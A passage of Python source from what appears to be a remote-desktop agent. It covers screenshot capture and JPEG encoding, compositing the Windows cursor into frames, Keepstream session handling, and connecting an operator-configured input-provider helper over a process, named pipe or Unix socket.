    if max_side <= 960:
        return 78
    if max_side <= 1280:
        return 82
    if max_side <= 1920:
        return 85
    if max_side <= 2560:
        return 88
    return 90


def _encode_rgb_jpeg(
    im: Any,
    max_side: int,
    *,
    live: bool = False,
    quality: int | None = None,
) -> tuple[bytes, int, int, str]:
    """Downscale RGB PIL image → JPEG (no PNG intermediate)."""
    from PIL import Image
    import io

    im = im.convert("RGB")
    w, h = im.size
    scale = min(1.0, float(max_side) / max(w, h, 1))
    q = _jpeg_quality_for_side(max_side, live=live, quality=quality)
    # Sharper resample whenever we care about clarity (stills or high-q stream)
    sharp = (not live) or q >= 58
    if scale < 0.999:
        try:
            if sharp:
                resample = Image.Resampling.LANCZOS  # type: ignore[attr-defined]
            else:
                resample = Image.Resampling.BILINEAR  # type: ignore[attr-defined]
        except AttributeError:
            resample = (
                getattr(Image, "LANCZOS", Image.BICUBIC) if sharp else Image.BILINEAR
            )
        im = im.resize(
            (max(1, int(w * scale)), max(1, int(h * scale))),
            resample,
        )
        w, h = im.size
    buf = io.BytesIO()
    # 4:4:4 chroma when sharp (much clearer text); 4:2:0 only for low-q stream
    save_kw: dict[str, Any] = {"format": "JPEG", "quality": q, "optimize": False}
    try:
        save_kw["subsampling"] = 0 if sharp else 2
        im.save(buf, **save_kw)
    except (TypeError, ValueError, OSError):
        buf = io.BytesIO()
        im.save(buf, format="JPEG", quality=q, optimize=False)
    return buf.getvalue(), w, h, "jpeg"


def _resize_png_if_needed(
    data: bytes,
    max_side: int,
    *,
    live: bool = False,
    quality: int | None = None,
) -> tuple[bytes, int, int, str]:
    """Optional Pillow downscale; else return as-is with unknown dims."""
    try:
        from PIL import Image
        import io

        im = Image.open(io.BytesIO(data))
        return _encode_rgb_jpeg(im, max_side, live=live, quality=quality)
    except Exception:
        return data, 0, 0, "png"


def _composite_cursor_win(im: Any) -> tuple[Any, dict[str, Any]]:
    """Paint the actual Windows system cursor onto a full-screen RGB image.

    GDI/mss/ImageGrab captures omit the hardware cursor; Remote Viewer needs it
    baked in so Control/View show the same arrow/ibeam/hand as the host.
    """
    import ctypes
    from ctypes import wintypes

    user32 = ctypes.windll.user32  # type: ignore[attr-defined]
    gdi32 = ctypes.windll.gdi32  # type: ignore[attr-defined]

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class CURSORINFO(ctypes.Structure):
        _fields_ = [
            ("cbSize", wintypes.DWORD),
            ("flags", wintypes.DWORD),
            ("hCursor", wintypes.HANDLE),
            ("ptScreenPos", POINT),
        ]

    class ICONINFO(ctypes.Structure):
        _fields_ = [
            ("fIcon", wintypes.BOOL),
            ("xHotspot", wintypes.DWORD),
            ("yHotspot", wintypes.DWORD),
            ("hbmMask", wintypes.HBITMAP),
            ("hbmColor", wintypes.HBITMAP),
        ]

    class BITMAP(ctypes.Structure):
        _fields_ = [
            ("bmType", ctypes.c_long),
            ("bmWidth", ctypes.c_long),
            ("bmHeight", ctypes.c_long),
            ("bmWidthBytes", ctypes.c_long),
            ("bmPlanes", wintypes.WORD),
            ("bmBitsPixel", wintypes.WORD),
            ("bmBits", ctypes.c_void_p),
        ]

    CURSOR_SHOWING = 0x00000001
    DI_NORMAL = 0x0003

    meta: dict[str, Any] = {"cursor": False}
    ci = CURSORINFO()
    ci.cbSize = ctypes.sizeof(CURSORINFO)
    if not user32.GetCursorInfo(ctypes.byref(ci)):
        return im, meta
    if not (int(ci.flags) & CURSOR_SHOWING):
        meta["cursor_hidden"] = True
        return im, meta
    if not ci.hCursor:
        return im, meta

    ii = ICONINFO()
    if not user32.GetIconInfo(ci.hCursor, ctypes.byref(ii)):
        return im, meta

    try:
        # Cursor size from mask/color bitmap
        bm = BITMAP()
        hb = ii.hbmColor or ii.hbmMask
        if not hb or not gdi32.GetObjectW(hb, ctypes.sizeof(bm), ctypes.byref(bm)):
            return im, meta
        cw = max(1, int(bm.bmWidth))
        ch = max(1, int(bm.bmHeight))
        if not ii.hbmColor and ii.hbmMask:
            # Monochrome mask is double-height (AND + XOR planes)
            ch = max(1, ch // 2)

        hdc_screen = user32.GetDC(0)
        if not hdc_screen:
            return im, meta
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        # 32-bpp DIB so we get alpha when available
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ("biSize", wintypes.DWORD),
                ("biWidth", ctypes.c_long),
                ("biHeight", ctypes.c_long),
                ("biPlanes", wintypes.WORD),
                ("biBitCount", wintypes.WORD),
                ("biCompression", wintypes.DWORD),
                ("biSizeImage", wintypes.DWORD),
                ("biXPelsPerMeter", ctypes.c_long),
                ("biYPelsPerMeter", ctypes.c_long),
                ("biClrUsed", wintypes.DWORD),
                ("biClrImportant", wintypes.DWORD),
            ]

        class BITMAPINFO(ctypes.Structure):
            _fields_ = [
                ("bmiHeader", BITMAPINFOHEADER),
                ("bmiColors", wintypes.DWORD * 3),
            ]

        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = cw
        bmi.bmiHeader.biHeight = -ch  # top-down
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = 0  # BI_RGB
        bits = ctypes.c_void_p()
        hbmp = gdi32.CreateDIBSection(
            hdc_screen,
            ctypes.byref(bmi),
            0,
            ctypes.byref(bits),
            None,
            0,
        )
        if not hbmp or not hdc_mem:
            if hdc_mem:
                gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)
            return im, meta
        old = gdi32.SelectObject(hdc_mem, hbmp)
        # Clear to transparent black
        gdi32.PatBlt(hdc_mem, 0, 0, cw, ch, 0x00000042)  # BLACKNESS
        user32.DrawIconEx(
            hdc_mem, 0, 0, ci.hCursor, cw, ch, 0, None, DI_NORMAL
        )
        # Read pixels
        buf_size = cw * ch * 4
        buf = (ctypes.c_char * buf_size)()
        gdi32.GetBitmapBits(hbmp, buf_size, buf)
        gdi32.SelectObject(hdc_mem, old)
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)

        from PIL import Image

        # Windows DIB is BGRA
        cur = Image.frombytes("RGBA", (cw, ch), bytes(buf), "raw", "BGRA")
        hot_x = int(ii.xHotspot)
        hot_y = int(ii.yHotspot)
        # ImageGrab / virtual screen origin can be non-zero on multi-mon;
        # GetCursorInfo is in virtual-screen coords. Align to image (0,0)=left-top of grab.
        # When grab is full virtual desktop, origin is SM_XVIRTUALSCREEN/Y.
        origin_x = int(user32.GetSystemMetrics(76))  # SM_XVIRTUALSCREEN
        origin_y = int(user32.GetSystemMetrics(77))  # SM_YVIRTUALSCREEN
        px = int(ci.ptScreenPos.x) - origin_x - hot_x
        py = int(ci.ptScreenPos.y) - origin_y - hot_y
        if im.mode != "RGBA":
            base = im.convert("RGBA")
        else:
            base = im.copy()
        base.paste(cur, (px, py), cur)
        out = base.convert("RGB")
        meta = {
            "cursor": True,
            "cursor_x": int(ci.ptScreenPos.x),
            "cursor_y": int(ci.ptScreenPos.y),
            "cursor_hot_x": hot_x,
            "cursor_hot_y": hot_y,
            "cursor_w": cw,
            "cursor_h": ch,
        }
        return out, meta
    except Exception as exc:
        meta["cursor_error"] = str(exc)[:120]
        return im, meta
    finally:
        if ii.hbmMask:
            gdi32.DeleteObject(ii.hbmMask)
        if ii.hbmColor:
            gdi32.DeleteObject(ii.hbmColor)


def _composite_system_cursor(im: Any) -> tuple[Any, dict[str, Any]]:
    """Overlay the host OS cursor so Remote Viewer matches the remote machine."""
    if im is None:
        return im, {"cursor": False}
    if os.name == "nt":
        try:
            return _composite_cursor_win(im)
        except Exception as exc:
            return im, {"cursor": False, "cursor_error": str(exc)[:120]}
    # Linux/mac: best-effort — many tools omit the pointer; leave frame as-is
    return im, {"cursor": False, "cursor_note": "composite_win_only"}


def _capture_screenshot(
    *,
    max_side: int = SHOT_MAX_SIDE,
    prefer_inline: bool = True,
    live: bool = False,
    quality: int | None = None,
    include_cursor: bool = True,
    persist: bool = True,
    return_bytes: bool = False,
) -> dict[str, Any]:
    """Capture desktop → inline base64 if small, else path for multi-chunk download.

    Prefer direct RGB→JPEG (no PNG round-trip). Still captures use higher JPEG
    quality + LANCZOS; Live uses faster encode. On Windows, the real system
    cursor is composited into the frame (same shape as on the host).

    ``persist=False`` skips writing hogwarts-desktop.* (Keepstream hot path).
    ``return_bytes=True`` puts raw JPEG in result[\"_bytes\"] (not for plane).
    """
    import base64
    import shutil
    import tempfile

    from PIL import Image  # type: ignore

    tmp_dir = Path(tempfile.gettempdir())
    out_png = tmp_dir / f"hogwarts-shot-{os.getpid()}.png"
    method = ""
    im: Any = None
    data: bytes | None = None
    w = h = 0
    fmt = "jpeg"
    enc_kw = {"live": live, "quality": quality}
    cursor_meta: dict[str, Any] = {"cursor": False}

    # 1) Optional mss (Linux/Windows) — keep full RGB until cursor paint
    if im is None:
        try:
            import mss  # type: ignore

            with mss.mss() as sct:
                mon = sct.monitors[0]
                shot = sct.grab(mon)
                im = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                method = "mss"
        except Exception:
            im = None

    # 2) Pillow ImageGrab (Windows/macOS)
    if im is None:
        try:
            from PIL import ImageGrab

            im = ImageGrab.grab()
            if im is not None:
                im = im.convert("RGB")
                method = "ImageGrab"
        except Exception:
            im = None

    # 3) CLI tools (prefer pointer-including variants when available)
    if im is None:
        cmds: list[list[str]] = []
        # scrot -p includes pointer
        if shutil.which("scrot"):
            cmds.append(["scrot", "-p", "-o", str(out_png)])
        if shutil.which("import"):
            cmds.append(["import", "-window", "root", str(out_png)])
        if shutil.which("gnome-screenshot"):
            cmds.append(["gnome-screenshot", "-f", str(out_png)])
        if shutil.which("scrot"):
            cmds.append(["scrot", "-o", str(out_png)])
        if shutil.which("grim"):
            cmds.append(["grim", str(out_png)])
        for argv in cmds:
            try:
                subprocess.run(
                    argv, capture_output=True, timeout=15, check=True
                )
                if out_png.is_file() and out_png.stat().st_size > 0:
                    raw = out_png.read_bytes()
                    im = Image.open(__import__("io").BytesIO(raw)).convert("RGB")
                    method = argv[0] + ("+ptr" if "-p" in argv else "")
                    if "-p" in argv:
                        cursor_meta = {
                            "cursor": True,
                            "cursor_note": "tool_includes_pointer",
                        }
                    break
            except Exception:
                im = None
                continue

    # 4) Synthetic lab frame (always works headless)
    if im is None:
        raw, w0, h0, method = _synthetic_desktop_png(label="no-display")
        try:
            im = Image.open(__import__("io").BytesIO(raw)).convert("RGB")
        except Exception:
            data, w, h, fmt = raw, w0, h0, "png"
            im = None

    if im is not None and include_cursor:
        # Only paint when the capture tool did not already include the pointer
        if not cursor_meta.get("cursor"):
            im, cursor_meta = _composite_system_cursor(im)
        data, w, h, fmt = _encode_rgb_jpeg(im, max_side, **enc_kw)
        if cursor_meta.get("cursor"):
            method = f"{method}+cursor"
    elif im is not None:
        data, w, h, fmt = _encode_rgb_jpeg(im, max_side, **enc_kw)

    if data is None:
        raw, w0, h0, method = _synthetic_desktop_png(label="no-display")
        data, w, h, fmt = _resize_png_if_needed(raw, max_side, **enc_kw)
        if not w:
            w, h, fmt = w0, h0, "png"

    shot_path: Path | str = ""
    if persist and data is not None:
        # Persist last shot for download path consumers
        ext = "jpg" if fmt == "jpeg" else "png"
        shot_path = tmp_dir / f"hogwarts-desktop.{ext}"
        try:
            Path(shot_path).write_bytes(data)
            _DESKTOP_STATE["last_shot"] = str(shot_path)
        except OSError:
            shot_path = out_png
            try:
                Path(shot_path).write_bytes(data)
                _DESKTOP_STATE["last_shot"] = str(shot_path)
            except OSError:
                shot_path = ""

    result: dict[str, Any] = {
        "width": w,
        "height": h,
        "format": fmt,
        "method": method,
        "size": len(data) if data else 0,
        "path": str(shot_path) if shot_path else "",
        "encoding": "base64",
        **cursor_meta,
    }
    if return_bytes and data is not None:
        result["_bytes"] = data
    if prefer_inline and data is not None and len(data) <= SHOT_INLINE_CAP:
        result["data"] = base64.b64encode(data).decode("ascii")
        result["inline"] = True
    elif data is not None:
        result["inline"] = False
        if persist:
            result["has_more"] = True  # desk should multi-chunk download path
    return result


def _desktop_stop() -> dict[str, Any]:
    proc = _DESKTOP_STATE.get("vnc_proc")
    if proc is not None:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
    port = _DESKTOP_STATE.get("vnc_port")
    _DESKTOP_STATE["vnc_proc"] = None
    _DESKTOP_STATE["vnc_port"] = None
    _DESKTOP_STATE["mode"] = None
    # Also tear down Keepstream if running
    ks = _session_stop({})
    return {"stopped": True, "port": port, "keepstream": ks}



def _session_start(payload: dict[str, Any]) -> dict[str, Any]:
    """Keepstream Session — implemented in keepstream.server (third_party)."""
    # input_provider is Hogwarts-agent specific
    ip_spec = _resolve_input_provider_spec(payload)
    if ip_spec is not None:
        ip_spec = dict(ip_spec)
        sid = None  # filled after start? need session before provider
    elev = _process_elevated()
    agent_id = str(payload.get("agent_id") or _RUNTIME.get("agent_id") or "")

    def _shot(side: int, quality: int) -> dict[str, Any]:
        try:
            return _capture_screenshot(
                max_side=int(side),
                live=True,
                quality=int(quality),
                include_cursor=True,
                persist=False,
                return_bytes=True,
            )
        except Exception:
            return {}

    # Start listen first without provider, then attach provider using returned session
    pl = dict(payload or {})
    if "agent_id" not in pl:
        pl["agent_id"] = agent_id
    # Pre-resolve input provider after we have session_id from result — two-phase:
    def _on_input(events: list) -> None:
        try:
            _desktop_input({"events": events})
        except Exception:
            pass

    res = _ks_session_start(
        pl,
        agent_id=agent_id,
        agent_version=VERSION,
        elevated=elev,
        screenshot_fn=_shot,
        input_handler=_on_input,
    )
    if not res.get("started"):
        return res
    # Start input provider with live session secrets
    sid = str(res.get("session_id") or "")
    psk = str(res.get("psk") or "")
    ip_spec = _resolve_input_provider_spec(payload)
    if ip_spec is not None:
        ip_spec = dict(ip_spec)
        ip_spec["session_id"] = sid
        ip_spec["psk"] = psk
    ip_status = _input_provider_start(ip_spec, session_id=sid, psk=psk)
    res["input_provider"] = ip_status
    res["agent_version"] = VERSION
    if elev is not None:
        res["elevated"] = elev
    note = str(res.get("note") or "")
    if ip_status.get("active"):
        kind = str(ip_status.get("kind") or "provider")
        note += f" input_provider active ({kind})."
        res["note"] = note
    return res


def _session_stop(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    _input_provider_stop()
    return _ks_session_stop(payload)


def _screen_size() -> tuple[int, int]:

    """Best-effort primary display size for coordinate mapping."""
    if os.name == "nt":
        try:
            import ctypes

            user32 = ctypes.windll.user32  # type: ignore[attr-defined]
            return int(user32.GetSystemMetrics(0)), int(user32.GetSystemMetrics(1))
        except Exception:
            return 1920, 1080
    # Linux: xdotool / xrandr
    import shutil

    if shutil.which("xdotool"):
        try:
            out = subprocess.check_output(
                ["xdotool", "getdisplaygeometry"],
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=3,
            ).strip()
            parts = out.split()
            if len(parts) >= 2:
                return int(parts[0]), int(parts[1])
        except Exception:
            pass
    if shutil.which("xdpyinfo"):
        try:
            out = subprocess.check_output(
                ["xdpyinfo"], stderr=subprocess.DEVNULL, text=True, timeout=3
            )
            for line in out.splitlines():
                if "dimensions:" in line:
                    # dimensions:    1920x1080 pixels
                    bit = line.split("dimensions:")[-1].strip().split()[0]
                    w, h = bit.lower().split("x", 1)
                    return int(w), int(h)
        except Exception:
            pass
    return 1920, 1080


def _ip_lock() -> Any:
    import threading

    if _INPUT_PROVIDER.get("lock") is None:
        _INPUT_PROVIDER["lock"] = threading.Lock()
    return _INPUT_PROVIDER["lock"]


def _normalize_input_provider(
    raw: Any, *, session_id: str = "", psk: str = ""
) -> dict[str, Any] | None:
    """Normalize agent.json / session_start ``input_provider`` (user plug-in).

    Empty / disabled → None (built-in local inject only). Hogwarts does not
    ship a UAC bypass; operators point this at their own helper binary.
    """
    if not isinstance(raw, dict):
        return None
    enabled = raw.get("enabled")
    command = str(raw.get("command") or raw.get("path") or raw.get("exe") or "").strip()
    kind = str(raw.get("kind") or "").strip().lower()
    pipe = str(raw.get("pipe") or "").strip()
    if enabled is False or enabled in ("0", "false", "no"):
        return None
    if not kind:
        if command:
            kind = "exec"
        elif pipe:
            kind = "pipe"
        else:
            kind = "none"
    if kind in ("", "none", "off", "local", "builtin"):
        return None
    if enabled is None and not command and not pipe:
        return None
    if kind == "exec" and not command:
        return None
    if kind == "pipe" and not pipe and not command:
        return None
    args = raw.get("args")
    if not isinstance(args, list):
        args = []
    args_s = [str(a) for a in args][:32]
    spawn = raw.get("spawn")
    if spawn is None:
        spawn = kind == "exec"
    else:
        spawn = bool(spawn) if not isinstance(spawn, str) else spawn.lower() not in (
            "0",
            "false",
            "no",
        )
    return {
        "kind": kind,
        "command": command,
        "args": args_s,
        "pipe": pipe,
        "spawn": spawn,
        "session_id": session_id or str(raw.get("session_id") or ""),
        "psk": psk or str(raw.get("psk") or ""),
        "cwd": str(raw.get("cwd") or "").strip(),
    }


def _input_provider_status() -> dict[str, Any]:
    return {
        "mode": str(_INPUT_PROVIDER.get("mode") or "local"),
        "active": _INPUT_PROVIDER.get("mode") == "provider",
        "error": str(_INPUT_PROVIDER.get("error") or "")[:200] or None,
        "spec": (
            {
                "kind": (_INPUT_PROVIDER.get("spec") or {}).get("kind"),
                "command": (_INPUT_PROVIDER.get("spec") or {}).get("command") or "",
                "pipe": (_INPUT_PROVIDER.get("spec") or {}).get("pipe") or "",
            }
            if _INPUT_PROVIDER.get("spec")
            else None
        ),
    }


def _input_provider_stop() -> None:
    """Tear down optional user input provider."""
    with _ip_lock():
        stream = _INPUT_PROVIDER.get("stream")
        proc = _INPUT_PROVIDER.get("proc")
        _INPUT_PROVIDER["stream"] = None
        _INPUT_PROVIDER["proc"] = None
        _INPUT_PROVIDER["mode"] = "local"
        _INPUT_PROVIDER["spec"] = None
        if stream is not None:
            try:
                stream.write("BYE\n")
                stream.flush()
            except Exception:
                pass
            try:
                stream.close()
            except Exception:
                pass
        if proc is not None:
            try:
                proc.terminate()
            except Exception:
                pass
            try:
                proc.wait(timeout=1.5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass


def _input_provider_start(
    spec: dict[str, Any] | None, *, session_id: str = "", psk: str = ""
) -> dict[str, Any]:
    """Start user plug-in if configured. Returns status dict for session_start."""
    _input_provider_stop()
    if not spec:
        return {"mode": "local", "active": False, "note": "no_input_provider"}
    kind = str(spec.get("kind") or "")
    command = str(spec.get("command") or "")
    pipe = str(spec.get("pipe") or "")
    args = list(spec.get("args") or [])
    sid = session_id or str(spec.get("session_id") or "")
    token = psk or str(spec.get("psk") or "")
    hello = f"HELLO hogwarts-input/1 {sid} {token}\n"

    try:
        if kind == "exec":
            if not command:
                raise RuntimeError("input_provider.command empty")
            cmd = [command, *args]
            # Env so user helpers can open pipes without argv gymnastics
            env = os.environ.copy()
            env["HOGWARTS_INPUT_PROTOCOL"] = "hogwarts-input/1"
            env["HOGWARTS_SESSION_ID"] = sid
            env["HOGWARTS_INPUT_PSK"] = token
            if pipe:
                env["HOGWARTS_INPUT_PIPE"] = pipe
            cwd = str(spec.get("cwd") or "") or None
            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                bufsize=1,
                cwd=cwd,
                env=env,
            )
            assert proc.stdin is not None
            assert proc.stdout is not None
            proc.stdin.write(hello)
            proc.stdin.flush()
            # Wait briefly for HELLO_OK (optional — many helpers may just absorb)
            try:
                import select

                r, _, _ = select.select([proc.stdout], [], [], 1.5)
                if r:
                    line = proc.stdout.readline().strip()
                    if line and not line.upper().startswith("HELLO_OK"):
                        # Still accept; user tools may use different ack
                        pass
            except Exception:
                pass
            with _ip_lock():
                _INPUT_PROVIDER["proc"] = proc
                _INPUT_PROVIDER["stream"] = proc.stdin
                _INPUT_PROVIDER["spec"] = spec
                _INPUT_PROVIDER["mode"] = "provider"
                _INPUT_PROVIDER["error"] = ""
            print(f"[agent] input_provider exec started: {command}", flush=True)
            return {
                "mode": "provider",
                "active": True,
                "kind": "exec",
                "command": command,
            }

        if kind == "pipe":
            # Connect to an already-running helper (user started elevated).
            # Retry briefly — Highest task / logon helper can lag Session start.
            target = pipe or command
            if not target:
                raise RuntimeError("input_provider.pipe empty")
            if os.name == "nt" and not target.startswith("\\\\.\\pipe\\"):
                leaf = target.replace("/", "\\").split("\\")[-1] or "hogwarts-input"
                target = f"\\\\.\\pipe\\{leaf}"
            if os.name == "nt":
                stream = _win_open_named_pipe_write(target, timeout_s=6.0)
                if stream is None:
                    hint = (
                        f"pipe not open: {target!r}. "
                        "Start helper first (must be listening): "
                        "schtasks /Run /TN HogwartsInputProvider "
                        "or C:\\HogwartsInputProvider\\HogwartsInputProvider.ps1. "
                        "Fallback: kind=exec + pipe-bridge.ps1 (.NET). "
                        "Agent >=0.5.32 tries WRITE then R|W CreateFileW."
                    )
                    raise RuntimeError(hint)
                try:
                    # Binary-safe write; ensure newline for StreamReader.ReadLine
                    if not hello.endswith("\n"):
                        hello = hello + "\n"
                    stream.write(hello)
                    stream.flush()
                except Exception as exc:
                    try:
                        stream.close()
                    except Exception:
                        pass
                    raise RuntimeError(f"pipe write HELLO failed: {exc}") from exc
                with _ip_lock():
                    _INPUT_PROVIDER["stream"] = stream
                    _INPUT_PROVIDER["spec"] = spec
                    _INPUT_PROVIDER["mode"] = "provider"
                    _INPUT_PROVIDER["error"] = ""
                print(f"[agent] input_provider pipe connected: {target}", flush=True)
                return {
                    "mode": "provider",
                    "active": True,
                    "kind": "pipe",
                    "pipe": target,
                }
            # Unix: treat as AF_UNIX path
            import socket as _socket

            sock = None
            for attempt in range(12):
                try:
                    sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect(target)
                    last_err = None
                    break
                except OSError as exc:
                    last_err = exc
                    try:
                        if sock is not None:
                            sock.close()
                    except Exception:
                        pass
                    sock = None
                    time.sleep(0.2 * (1 + attempt // 3))
            if sock is None:
                raise last_err or RuntimeError("unix_pipe_connect_failed")
            sock.sendall(hello.encode("utf-8"))
            f = sock.makefile("rwb", buffering=0)

            class _SockLine:
                def write(self, s: str) -> None:
                    f.write(s.encode("utf-8"))

                def flush(self) -> None:
                    f.flush()

                def close(self) -> None:
                    try:
                        f.close()
                    except Exception:
                        pass
                    try:
                        sock.close()
                    except Exception:
                        pass

            with _ip_lock():
                _INPUT_PROVIDER["stream"] = _SockLine()
                _INPUT_PROVIDER["spec"] = spec
                _INPUT_PROVIDER["mode"] = "provider"
                _INPUT_PROVIDER["error"] = ""
            return {
                "mode": "provider",
                "active": True,
                "kind": "pipe",
                "pipe": target,
            }

        raise RuntimeError(f"unknown input_provider.kind={kind}")
    except Exception as exc:
        _input_provider_stop()
        _INPUT_PROVIDER["error"] = str(exc)[:200]
        print(f"[agent] input_provider failed: {exc}", flush=True)
        return {
            "mode": "local",
            "active": False,
            "error": str(exc)[:200],
            "note": "provider_start_failed_fallback_local",
        }


def _win_open_named_pipe_write(target: str, *, timeout_s: float = 6.0):
    """Open a Windows named pipe for line writes (input_provider client).

    Uses WaitNamedPipeW + CreateFileW (R+W duplex — write-only clients can
    hang on WriteFile against some .NET/PS pipe servers). Falls back to open().
    Returns a binary-friendly text write stream or None on timeout/failure.
    """
    if os.name != "nt":
        return None
    deadline = time.monotonic() + max(0.5, float(timeout_s))
    last: Exception | None = None
    # Prefer Win32 APIs — plain open() often reports ENOENT while the server
    # is between instances or not yet in WaitForConnection.
    try:
        import ctypes
        from ctypes import wintypes
        import msvcrt

        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        WaitNamedPipeW = kernel32.WaitNamedPipeW
        WaitNamedPipeW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD]
        WaitNamedPipeW.restype = wintypes.BOOL
        CreateFileW = kernel32.CreateFileW
        CreateFileW.argtypes = [
            wintypes.LPCWSTR,
            wintypes.DWORD,
            wintypes.DWORD,
            wintypes.LPVOID,
            wintypes.DWORD,
            wintypes.DWORD,
            wintypes.HANDLE,
        ]
        CreateFileW.restype = wintypes.HANDLE
        SetNamedPipeHandleState = kernel32.SetNamedPipeHandleState
        SetNamedPipeHandleState.argtypes = [
            wintypes.HANDLE,
            ctypes.POINTER(wintypes.DWORD),
            ctypes.POINTER(wintypes.DWORD),
            ctypes.POINTER(wintypes.DWORD),
        ]
        SetNamedPipeHandleState.restype = wintypes.BOOL
        GENERIC_READ = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80
        FILE_FLAG_OVERLAPPED = 0x40000000
        PIPE_READMODE_BYTE = 0x00000000
        INVALID = ctypes.c_void_p(-1).value

        class _PipeText:
            def __init__(self, r: Any) -> None:
                self._r = r

            def write(self, s: str) -> int:
                data = s.encode("utf-8") if isinstance(s, str) else s
                self._r.write(data)
                return len(data)

            def flush(self) -> None:
                try:
                    self._r.flush()
                except Exception:
                    pass

            def close(self) -> None:
                try:
                    self._r.close()
                except Exception:
                    pass

        def _try_create(access: int, fd_flags: int, mode: str) -> Any | None:
            nonlocal last
            WaitNamedPipeW(target, 500)
            handle = CreateFileW(
                target,
                access,
                0,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
            if handle is None or handle == INVALID or int(handle) == -1:
                err = ctypes.get_last_error()
                last = OSError(err, f"CreateFileW access=0x{access:x} winerr={err}")
                return None
            try:
                pmode = wintypes.DWORD(PIPE_READMODE_BYTE)
                SetNamedPipeHandleState(handle, ctypes.byref(pmode), None, None)
            except Exception:
                pass
            fd = msvcrt.open_osfhandle(int(handle), fd_flags)
            raw = open(fd, mode, buffering=0)  # noqa: SIM115
            return _PipeText(raw)

        while time.monotonic() < deadline:
            try:
                # 1) WRITE-only — matches helper PipeDirection.In (clients write)
                stream = _try_create(GENERIC_WRITE, os.O_WRONLY, "wb")
                if stream is not None:
                    return stream
                # 2) Duplex — some InOut servers require R|W
                stream = _try_create(
                    GENERIC_READ | GENERIC_WRITE, os.O_RDWR, "rb+"
                )
                if stream is not None:
                    return stream
                time.sleep(0.15)
            except OSError as exc:
                last = exc
                time.sleep(0.15)
            except Exception as exc:
                last = exc  # type: ignore[assignment]
                time.sleep(0.15)
    except Exception as exc:
        last = exc  # type: ignore[assignment]

    # Fallback: builtin open() with short retries (often ENOENT on this host)
    while time.monotonic() < deadline:
        try:
            return open(target, "w", encoding="utf-8", buffering=1)  # noqa: SIM115
        except OSError as exc:
            last = exc
            time.sleep(0.2)
    if last:
        print(f"[agent] pipe open failed {target!r}: {last}", flush=True)
    return None


def _input_provider_send(events: list[dict[str, Any]]) -> bool:
    """Forward events to user provider. True if handled (skip local inject)."""
    if _INPUT_PROVIDER.get("mode") != "provider":
        return False
    stream = _INPUT_PROVIDER.get("stream")
    if stream is None or not events:
        return False
    line = json.dumps({"events": events[:48]}, separators=(",", ":")) + "\n"
    with _ip_lock():
        stream = _INPUT_PROVIDER.get("stream")
        if stream is None:
            return False
        try:
            stream.write(line)
            stream.flush()
            return True
        except Exception as exc:
            _INPUT_PROVIDER["error"] = str(exc)[:200]
            _INPUT_PROVIDER["mode"] = "local"
            print(f"[agent] input_provider send failed: {exc}", flush=True)
            return False


def _resolve_input_provider_spec(
    payload: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """session_start payload overrides agent.json ``input_provider``."""
    cfg = _RUNTIME.get("cfg") if isinstance(_RUNTIME.get("cfg"), dict) else {}
    from_cfg = _normalize_input_provider(cfg.get("input_provider") if cfg else None)
    from_pl = None
    if isinstance(payload, dict) and "input_provider" in payload:
        from_pl = _normalize_input_provider(payload.get("input_provider"))
        # Explicit null / empty from desk clears cfg for this session
        raw = payload.get("input_provider")
        if raw in (None, {}, False) or (
            isinstance(raw, dict)
            and raw.get("enabled") is False
        ):
            return None
    return from_pl if from_pl is not None else from_cfg


def _process_elevated() -> bool | None:
    """True if this process can inject into elevated UI (admin/SYSTEM).

    Windows UIPI blocks a medium-IL agent from controlling Task Manager and
    other admin windows — same class of issue Parsec documents. None if unknown.
    """
    if os.name != "nt":
        return True
    try:
        import ctypes
        from ctypes import wintypes

        advapi = ctypes.windll.advapi32  # type: ignore[attr-defined]
        kernel = ctypes.windll.kernel32  # type: ignore[attr-defined]
        token = wintypes.HANDLE()
        if not kernel.OpenProcessToken(
            kernel.GetCurrentProcess(), 0x0008, ctypes.byref(token)
        ):  # TOKEN_QUERY
            return None
        try:
            # TokenElevation
            class TOKEN_ELEVATION(ctypes.Structure):
                _fields_ = [("TokenIsElevated", wintypes.DWORD)]

            elev = TOKEN_ELEVATION()
            size = wintypes.DWORD()
            if not advapi.GetTokenInformation(
                token, 20, ctypes.byref(elev), ctypes.sizeof(elev), ctypes.byref(size)
            ):
                return None
            return bool(elev.TokenIsElevated)
        finally:
            kernel.CloseHandle(token)
    except Exception:
        return None


def _desktop_input(payload: dict[str, Any]) -> dict[str, Any]:
    """Inject mouse/keyboard for Remote Viewer Control mode.

    Event types: move | rmove | click | dblclick | down | up | key |
    key_down | key_up | type | wheel | wheel_h
    Position: fx/fy in [0,1] of primary screen, or absolute x/y pixels.
    Relative: rmove with dx/dy host pixels (Parsec-class gaming).
    Key mods: optional ``mods`` list: ctrl, alt, shift, super.
    Games (Roblox etc.): prefer key_down/key_up holds over tap ``key``.

    If a user ``input_provider`` plug-in is active, events are forwarded to it
    (operator-supplied elevated helper). Otherwise local SendInput/xdotool.
    """
    import shutil

    raw_events = payload.get("events")
